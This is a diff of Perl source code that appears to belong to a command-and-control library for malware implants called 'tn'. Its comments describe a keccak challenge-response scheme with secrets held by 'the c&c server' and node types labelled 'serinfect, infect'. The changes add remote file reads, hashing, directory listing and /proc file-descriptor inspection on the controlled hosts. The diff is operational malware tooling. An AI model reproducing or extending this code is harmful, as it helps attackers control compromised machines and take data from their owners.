@@ -45,6 +45,24 @@ my $KEY_FIXED = pack "H*", "not-the-real-secret";
 my $KEY_NODE  = pack "H*", "not-the-real-secret";
 my $KEY_TYPE  = pack "H*", "not-the-real-secret";
 
+# tn's out there have an id and shared secret that
+# is unique to each one. the challenge response protocol works
+# by sending a random 32 byte string, the id,
+# and expects keccak(challange . id . secret)
+# server needs to know the secret.
+#
+# this can be accomplished in a variety of ways
+# the secret can be in the database, or it can be
+# derived from the id, using a secret key:
+# keccak($KEY_FIXED . keccak(secret . $KEY_FIXED))
+# the key, obviously, is only known to the c&c server
+# the tn component receives the resulting secret as commandline argument
+#
+# the first byte of keccak(id . $KEY_TYPE) also encodes a type
+# 1 - serinfect, infect
+# 2 - tnr upgraded
+# 3 - tncmd
+
 sub gencreds(;$)
 {
 	my ($type) = @_;
@@ -399,10 +417,18 @@ sub lseek
 
 sub readall_
 {
-	my ($self, $cb) = @_;
+	my $cb = pop;
+	my ($self, $len) = @_;
 
 	my $guard = $self->{wl}->guard;
-	$self->wpkt(chr 18);
+	if (defined $len) {
+		$self->{version} >= 9
+			or die "$self->{host}: limited read on old tn\n";
+	} else {
+		$len = 0xffffffff;
+	}
+
+	$self->wpkt(pack "C x3 L$self->{endian}", 18, $len);
 
 	$self->{rq}->put(
 		sub {
@@ -414,6 +440,14 @@ sub readall_
 
 			$cb->(join "", @data);
 		});
+}
+
+sub pread_
+{
+	my ($self, $ofs, $len, $cb) = @_;
+
+	$self->lseek($ofs, 0);
+	$self->readall_($len, $cb);
 }
 
 sub read_file_
@@ -508,9 +542,12 @@ sub readlink_
 	}
 }
 
-sub getdents_
+sub _getdents_
 {
 	my ($self, $cb) = @_;
+
+	$self->{version} < 9
+		or die "$self->{name}: getdents on new version";
 
 	my $guard = $self->{wl}->guard;
 	$self->wpkt(chr 15);
@@ -554,28 +591,45 @@ sub readdir_
 
 	if ($cb = $self->_cache(ls => $path, $cb)) {
 		$self->open($path);
-		$self->getdents_($cb);
+
+		if ($self->{version} >= 9) {
+			my $guard = $self->{wl}->guard;
+			$self->wpkt(chr 15);
+			$self->{rq}->put(
+				sub {
+					my (@names, $name);
+
+					while (length($name = $self->rpkt)) {
+						push @names, $name
+							if $name !~ /^(\.|\.\.)$/;
+					}
+
+					$cb->(\@names);
+				});
+
+		} else {
+			$self->_getdents_($cb);
+		}
 		$self->close;
 	}
 }
 
-sub ls_
-{
-	my ($self, $path, $cb) = @_;
-
-	$self->readdir_(
-		$path,
-		sub {
-			$cb->([map $_->[2], @{ $_[0] }]);
-		});
-}
+*ls_ = \&readdir_;    # TODO: remove
 
 sub fnv32a_
 {
-	my ($self, $cb) = @_;
+	my $cb = pop;
+	my ($self, $len) = @_;
+
+	if (defined $len) {
+		$self->{version} >= 9
+			or die "$self->{host}: limited fnv32a on old tn\n";
+	} else {
+		$len = 0xffffffff;
+	}
 
 	my $guard = $self->{wl}->guard;
-	$self->wpkt(chr 17);
+	$self->wpkt(pack "C x3 L$self->{endian}", 17, $len);
 	$self->{rq}->put(
 		sub {
 			$cb->(unpack "L$self->{endian}", $self->rpkt);
@@ -852,13 +906,13 @@ sub portinfo_
 				$self->readdir_(
 					"/proc/$pid/fd",
 					sub {
-						for my $dent (@{ $_[0] }) {
+						for my $path (@{ $_[0] }) {
 							if (0) {
 								$cv->begin;
 								$self->readlink_(
-									"/proc/$pid/fd/$dent->[2]",
+									"/proc/$pid/fd/$path",
 									sub {
-										warn "$pid $dent->[2] <$_[0]>\n";
+										warn "$pid $path <$_[0]>\n";
 
 										# "socket:[12345]" type 1
 										# "[0000]:12345" # type 2
